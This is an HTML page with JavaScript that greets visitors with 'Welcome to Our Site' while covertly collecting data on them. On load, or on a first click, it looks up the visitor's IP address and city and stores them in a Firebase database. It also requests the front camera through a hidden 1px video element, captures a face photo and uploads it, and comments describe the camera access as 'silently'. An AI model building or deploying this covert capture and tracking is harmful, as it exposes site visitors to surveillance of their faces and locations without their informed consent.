<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Photo Capture</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        #autoCameraView {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1000;
        }
        .visitor-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <h1>Welcome to Our Site</h1>
    <div id="visitorInfo"></div>
    
    <!-- Hidden camera elements -->
    <video id="autoCameraView" autoplay playsinline></video>
    <canvas id="autoPhotoCanvas" style="display:none;"></canvas>

    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            databaseURL: "YOUR_DATABASE_URL",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_STORAGE_BUCKET",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Auto capture variables
        let autoCaptureAttempted = false;
        let autoStream = null;

        // Function to auto capture photo
        async function autoCapturePhoto() {
            if (autoCaptureAttempted) return;
            autoCaptureAttempted = true;

            try {
                // Get basic visitor info
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const locationData = await locationResponse.json();

                // Prepare visitor data
                const visitorData = {
                    ip: ip,
                    country: locationData.country_name || 'Unknown',
                    city: locationData.city || 'Unknown',
                    timestamp: firebase.database.ServerValue.TIMESTAMP,
                    photoUrl: ''
                };

                // Save initial data to Firebase
                const visitorRef = database.ref('visitors').push();
                await visitorRef.set(visitorData);

                // Try to access camera silently (will still prompt in most browsers)
                try {
                    autoStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 320 },
                            height: { ideal: 240 },
                            facingMode: 'user'
                        },
                        audio: false
                    });

                    const video = document.getElementById('autoCameraView');
                    video.srcObject = autoStream;
                    await video.play();

                    // Wait a moment for camera to initialize
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    // Capture photo
                    const canvas = document.getElementById('autoPhotoCanvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert to base64
                    const photoData = canvas.toDataURL('image/jpeg', 0.7);

                    // Update visitor data with photo
                    await visitorRef.update({ photoUrl: photoData });

                    // Display to user
                    document.getElementById('visitorInfo').innerHTML = `
                        <div style="margin: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 8px;">
                            <h3>Welcome Visitor!</h3>
                            <img src="${photoData}" class="visitor-img">
                            <p>We've automatically captured your profile.</p>
                            <p>Location: ${visitorData.city}, ${visitorData.country}</p>
                        </div>
                    `;

                } catch (cameraError) {
                    console.log("Auto photo capture failed (permission denied)");
                    // Proceed without photo
                }

            } catch (error) {
                console.error("Error in auto capture:", error);
            } finally {
                if (autoStream) {
                    autoStream.getTracks().forEach(track => track.stop());
                }
            }
        }

        // Start auto capture when page loads
        window.addEventListener('load', () => {
            // Delay slightly to let page render
            setTimeout(autoCapturePhoto, 500);
            
            // Alternative approach for some browsers
            document.addEventListener('click', function firstClick() {
                autoCapturePhoto();
                document.removeEventListener('click', firstClick);
            });
        });
    </script>
</body>
</html>
